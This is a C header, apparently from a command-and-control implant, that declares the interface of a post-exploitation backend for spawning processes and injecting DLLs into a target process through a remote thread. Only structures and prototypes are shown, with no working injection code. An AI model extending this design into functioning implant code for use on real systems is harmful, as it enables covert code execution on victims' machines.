#pragma once

#include "beacon_postex.h"
#include "beacon_postex_module.h"

#define POSTEX_CMDLINE_MAX 1024u
#define POSTEX_ERROR_MAX 128u

#define POSTEX_BACKEND_REMOTE_THREAD 1u

#define POSTEX_BACKEND_CAP_SPAWN_DLL  0x00000001u
#define POSTEX_BACKEND_CAP_INJECT_DLL 0x00000002u

typedef struct PostExStartRequest {
    UINT32 task_id;
    UINT32 subcmd;
    UINT32 backend_kind;
    UINT32 wait_ms;
    DWORD target_pid;
    BOOL owns_process;
    CHAR pipe_name[POSTEX_PIPE_NAME_MAX];
    CHAR description[64];
    CHAR module_args[512];
    CHAR spawn_path[MAX_PATH];
    CHAR spawn_args[512];
    UINT32 max_runtime_ms;
    UINT32 idle_timeout_ms;
    ByteBuf dll;
} PostExStartRequest;

typedef struct PostExStartResult {
    HANDLE process;
    HANDLE remote_thread;
    DWORD pid;
    BOOL owns_process;
    PVOID remote_image;
    PVOID remote_config;
    UINT32 backend_kind;
} PostExStartResult;

typedef struct PostExBackendOps {
    UINT32 kind;
    const CHAR* name;
    UINT32 caps;
    BOOL (*Start)(const PostExStartRequest* req,
                  PostExStartResult* result,
                  CHAR* err,
                  SIZE_T err_size);
    VOID (*CleanupStartResult)(const PostExStartRequest* req,
                               PostExStartResult* result);
    VOID (*CleanupJob)(PostExJob* job, BOOL kill_process);
    BOOL (*CancelJob)(PostExJob* job, UINT32 reason);
} PostExBackendOps;

BOOL PostExRemoteCompleted(PostExJob* job);
BOOL PostExBuildSpawnCommandLine(const CHAR* exe_path, const CHAR* args,
                                 CHAR* out, SIZE_T out_size);
VOID PostExFillConfig(PostExConfig* config, const WCHAR* pipe_name,
                      const CHAR* args);
VOID PostExFormatRemoteThreadStatus(HANDLE thread, CHAR* out, SIZE_T out_size);
VOID PostExFormatRemoteConfigStatus(HANDLE process, PVOID remote_config,
                                    CHAR* out, SIZE_T out_size);
VOID PostExStartResultInit(PostExStartResult* result);
const PostExBackendOps* PostExBackendFind(UINT32 kind);
VOID PostExBackendCleanupStartResult(const PostExStartRequest* req,
                                     PostExStartResult* result);
VOID PostExBackendCleanupJob(PostExJob* job, BOOL kill_process);
BOOL PostExBackendCancelJob(PostExJob* job, UINT32 reason);
BOOL PostExStartRemote(const PostExStartRequest* req,
                       PostExStartResult* result,
                       CHAR* err,
                       SIZE_T err_size);
